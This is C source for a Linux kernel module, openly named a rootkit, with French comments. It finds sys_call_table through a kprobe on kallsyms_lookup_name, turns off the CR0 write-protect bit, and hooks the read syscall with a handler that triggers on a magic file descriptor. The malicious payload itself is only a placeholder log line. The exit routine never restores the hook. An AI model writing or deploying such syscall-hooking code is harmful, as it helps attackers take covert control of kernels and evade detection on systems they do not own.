#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/kprobes.h>
#include <linux/unistd.h>
#include <asm/special_insns.h>
#include <asm/processor-flags.h>

void cr0_write(unsigned long val){
	asm volatile("mov %0,%%cr0"
	: "+r"(val)
	:
	: "memory");
}

static inline unsigned long unprotect_memory(void){
	unsigned long cr0;
	unsigned long newcr0;
	cr0 = native_read_cr0();
	newcr0 = cr0 & ~(X86_CR0_WP);
	cr0_write(newcr0);
	return cr0;
}

static inline void protect_memory(unsigned long oldcr0){
	cr0_write(oldcr0);
}

ssize_t read(int fd, void *buf, size_t count);
ssize_t (*old_read)(struct pt_regs *regs);

typedef void *(*kallsyms_t)(const char *);

// structure pour register_kprobe
struct kprobe probe = {
	.symbol_name = "kallsyms_lookup_name"
};

// pointeur de fonction vers kallsyms_lookup_name
kallsyms_t lookup_name;

// address de la syscall table
uint64_t *syscall_table = 0;


int new_read(struct pt_regs *regs)
{
	int fd = (int)regs->di;
	void *buf = (void*)regs->si;
	size_t count = (size_t)regs->dx;
	(void) buf;
	(void) count;
	if (fd != 0xfacafaca)
	return old_read(regs);
	pr_info("[+] HERE MALICIOUS CODE\n");
	// ...
	return 2600;
}


static int __init rootkit_init(void){
	
	unsigned long old_cr0;
	//ssize_t new_read(struct pt_regs *regs);
	
	pr_info("Init HERE\n");

	if (register_kprobe(&probe)) {
		pr_info("[-] Failed to get kallsyms_lookup_name() address.\n");
		return 0;
	}

	// pointeur de fonction vers kallsyms_lookup_name
	lookup_name = (kallsyms_t)(probe.addr);
	pr_info("[+] get kallsyms_lookup_name address at %p\n", lookup_name);
	
	// relache le mécanisme
	unregister_kprobe(&probe);
	
	// address de la syscall table
	syscall_table = lookup_name("sys_call_table");
	pr_info("[+] sys_call_table at %p\n", syscall_table);
	
	// débranche la protection mémoire
	// attention: il faudra avoir déclarer old_cr0 au début de `rootkit_init`
	// par exemple: unsigned long old_cr0;
	old_cr0 = unprotect_memory();
	old_read = (ssize_t(*)(struct pt_regs*)) syscall_table[__NR_read];
	syscall_table[__NR_read] = (uint64_t) new_read;
	
	// rebranche la protection mémoire
	protect_memory(old_cr0);	
	return 0;
}

static void __exit rootkit_exit(void){
	pr_info("Exit HERE\n");
}

module_init(rootkit_init);

module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
